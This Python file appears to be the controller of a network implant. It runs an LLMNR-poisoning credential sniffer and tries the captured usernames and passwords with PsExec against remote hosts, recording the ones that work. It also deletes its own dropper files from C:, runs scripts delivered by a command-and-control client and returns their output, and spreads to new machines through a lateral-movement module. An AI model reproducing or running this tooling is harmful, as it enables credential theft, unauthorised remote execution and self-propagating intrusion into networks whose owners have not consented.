import multiprocessing
import os
import shutil
import subprocess
import sys
import time
import LlmnrPoisining.hashcat.sniffCredentials as sniffCredentials
import LateralMovement.transfer as transfer
import communication.ClientSide.client as client

# def get_ip_for_mac(mac_address):
#     ans , unans = sr1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=3, hwdst=mac_address))
#     print(ans)
#     for s, r in ans:
#         if r[ARP].hwsrc == mac_address:
#             return r[ARP].psrc
#     return None


def sniff(conn2):
    os.chdir('./LlmnrPoisining/hashcat/')
    sniffCredentials.main(conn2)


def comm():
    os.chdir('./communication/ClientSide/')
    client.main()


def script(filename):
    os.chdir('./communication/ClientSide/script')
    with open(filename.split('.')[0] + 'Output.txt', 'w') as f:
        subprocess.call(['python', filename], stdout=f)
        f.close()
    os.remove('./' + filename)
    for f in os.listdir('./'):
        shutil.move('./' + f, '../output/' + f)




def main():
    if os.path.isfile('c:/FileTransfer.py'):
        os.remove('c:/FileTransfer.py')
    if os.path.isfile('c:/initiator.py'):
        os.remove('c:/initiator.py')
    if os.path.isfile('c:/CreateEnv.py'):
        os.remove('c:/CreateEnv.py')
    sniffer_conn, conn2 = multiprocessing.Pipe()
    sniffer = multiprocessing.Process(target=sniff, args=(conn2,))
    sniffer.start()
    commu = multiprocessing.Process(target=comm)
    t = time.time()
    run = multiprocessing.Process()
    while True:
        if sniffer_conn.poll():
            data = sniffer_conn.recv()
            print(data)
            os.chdir('./LateralMovement')
            privilege = os.popen(r'Psexec \\' + data[2] + ' -u ' + data[0] + ' -p ' + data[1] + ' -i -s ipconfig')
            print(privilege.read())
            privilege = privilege.close()
            os.chdir('..')
            if (privilege == None or privilege == 0):
                if (os.path.exists('communication/ClientSide/output/default.txt')):
                    mode = 'a'
                else:
                    mode = 'w'
                with open('communication/ClientSide/output/default.txt', mode) as f:
                    f.write(f'{ip}:{data[0]}:{data[1]}\n')
            print(str(privilege))

        filename = os.listdir('./communication/ClientSide/script')
        if (filename and not run.is_alive()):
            print('new process')
            print(filename)
            filename = filename[0]
            if (filename == 'move.txt'):
                with open('./communication/ClientSide/script/' + filename, 'r') as f:
                    ip, user, password = f.read().split(':')
                    f.close()
                os.remove('./communication/ClientSide/script/' + filename)
                if ip:
                    os.chdir('./LateralMovement')
                    sniffer.terminate()
                    result = transfer.main(ip, user, password)
                    print('finished tranfer')
                    if(result):
                        sys.exit()
                    else:
                        print(result)
            else:
                while(commu.is_alive()):
                    pass
                run = multiprocessing.Process(target=script, args=(filename,))
                run.start()

        if (not commu.is_alive() and time.time() - t > 5):
            print('comm')
            commu = multiprocessing.Process(target=comm)
            commu.start()
            t = time.time()


if __name__ == '__main__':
    main()
